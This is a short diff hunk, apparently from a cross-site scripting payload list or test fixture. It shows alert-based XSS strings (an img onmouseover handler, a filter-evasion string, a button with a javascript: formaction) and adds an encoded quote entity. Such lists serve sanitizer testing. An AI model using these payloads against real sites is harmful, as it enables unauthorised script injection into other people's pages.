@@ -5,3 +5,4 @@
   <img src=x onmouseover="alert('xxs')">
 <'';!--"<<XSS>=&{()}
 <form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+&#34
